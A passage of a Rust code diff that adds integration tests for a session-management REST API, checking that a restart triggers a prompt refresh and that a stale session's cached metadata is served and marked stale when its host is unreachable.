+                        session: farhelm_proto::SessionInfo {
+                            status: farhelm_proto::SessionStatus::Unknown,
+                            ..rest_harness::session("sess-1", 500)
+                        },
+                    })
+                    .await
+                    .unwrap();
+            }
+        });
+
+        let harness = rest_harness::spliced_helm_listing(client_side, vec![exited]).await;
+        let (_, before) = get_json(&harness, "/api/sessions").await;
+        assert_eq!(before["sessions"][0]["status"]["state"], "exited");
+
+        // The host is ALIVE from here on — which the helm can only learn by
+        // listing again.
+        harness
+            .fleet
+            .edit(rest_harness::local_id(&harness.store).await, |script| {
+                script.sessions = vec![rest_harness::session("sess-1", 500)];
+            });
+
+        let (status, body) = post_text(
+            &harness,
+            "/api/sessions/sess-1/restart",
+            serde_json::json!({ "mode": "fresh" }),
+        )
+        .await;
+        assert_eq!(status, axum::http::StatusCode::OK, "{body}");
+
+        // Wait for the SECOND list request — the woken drain. Counting
+        // requests rather than watching for a refresh state is what makes
+        // this deterministic: the connect-time refresh already produced a
+        // successful one-session result, so a state-shaped wait is
+        // satisfied by the pre-restart pass and proves nothing. No clock is
+        // advanced anywhere in this test, so a second request can only have
+        // come from the wake — and the bound turns a missing one into a
+        // failed test rather than a hung CI run.
+        tokio::time::timeout(
+            std::time::Duration::from_secs(30),
+            harness.fleet.await_list_requests(2),
+        )
+        .await
+        .expect("the write must wake a refresh; no second list request ever arrived");
+        // The wait above resolves when the fake RECEIVES the second request;
+        // the helm still has to process the reply and commit it, and a loaded
+        // runner can stretch that gap past a one-shot assertion (seen twice
+        // in full-workspace runs, never in isolation). Polling briefly does
+        // not weaken the proof: the cadence is an hour of real time, so
+        // within this window the woken drain is still the only thing that
+        // can have produced the transition.
+        let deadline = tokio::time::Instant::now() + std::time::Duration::from_secs(10);
+        let after = loop {
+            let (_, after) = get_json(&harness, "/api/sessions").await;
+            if after["sessions"][0]["status"]["state"] == "alive"
+                || tokio::time::Instant::now() >= deadline
+            {
+                break after;
+            }
+            tokio::time::sleep(std::time::Duration::from_millis(25)).await;
+        };
+        assert_eq!(
+            after["sessions"][0]["status"]["state"], "alive",
+            "the definite status must arrive in one round trip, not one refresh interval: {after}"
+        );
+        peer.abort();
+    }
+
+    /// A stale session's DETAIL is served, not refused — the one
+    /// `/api/sessions/{id}` route a down host does not turn away.
+    ///
+    /// SPEC.md: "opening such a session shows its metadata — title,
+    /// directory, last-known status — behind a clear host-unreachable
+    /// notice". Refusing here would leave the UI nothing to draw behind
+    /// that notice, so the read is served from the cache and marked
+    /// `stale`, while every mutating route on the same session still
+    /// refuses (pinned above).
+    #[tokio::test]
+    async fn a_stale_sessions_detail_is_served_from_the_cache_and_marked_stale() {
+        let (builder, host) = rest_harness::FleetBuilder::new()
+            .await
+            .ssh(
+                "user@breaks",
+                rest_harness::HostScript {
+                    identity: Some("identity-original".to_string()),
+                    sessions: vec![farhelm_proto::SessionInfo {
+                        title: "the work in progress".to_string(),
+                        cwd: "/home/user/project".to_string(),
+                        ..rest_harness::session("owned", 100)
+                    }],
+                    ..rest_harness::HostScript::default()
+                },
+            )
+            .await;
+        let harness = builder.start().await;
+        harness.await_refreshed(host).await;
+        harness.fleet.take_down(host);
+        harness
+            .await_state(host, |state| state.phase() == "unreachable-reprobing")
+            .await;
+
+        let (status, value) = get_json(&harness, "/api/sessions/owned").await;
+        assert_eq!(status, axum::http::StatusCode::OK);
+        assert_eq!(value["title"], "the work in progress");
+        assert_eq!(value["cwd"], "/home/user/project");
+        assert_eq!(value["host"], host);
+        assert_eq!(
+            value["stale"], true,
+            "the metadata is last-known knowledge and must say so"
         );
     }
 }
